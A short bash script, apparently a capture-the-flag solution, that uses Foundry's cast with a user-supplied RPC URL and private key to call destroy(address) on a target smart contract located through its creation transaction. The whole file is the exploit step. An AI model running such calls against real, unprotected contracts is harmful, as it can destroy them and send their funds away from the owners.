#!/bin/bash

set -o pipefail
set -o nounset

if [ "$#" -lt 3 ]; then
	echo "Usage: $0 <target> <rpc> <pk>"
	echo "You can find your target on etherscan.io. Find the contract then review the creation transaction, look how many contrats were build."
fi

TARGET="$1"
RPC="$2"
PK="$3"

cast send $TARGET "destroy(address)" "0x0" -r $RPC --private-key $PK
